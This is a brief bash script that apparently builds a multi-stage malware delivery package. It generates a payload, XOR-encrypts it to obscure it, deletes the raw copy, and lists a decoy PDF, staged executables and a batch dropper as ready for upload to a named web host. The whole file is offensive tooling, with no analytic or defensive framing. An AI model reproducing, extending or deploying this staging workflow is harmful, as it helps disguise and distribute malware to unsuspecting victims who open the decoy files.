#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
[ -f output/payload.raw ] && python3 tools/xor_encrypt.py output/payload.raw payload.enc 106
rm -f output/payload.raw
echo "Files ready for https://domenca.vercel.app/generated: payload.enc decoy.pdf payloads/stage2.exe payloads/stage3b.exe payloads/stage1.bat index.html"
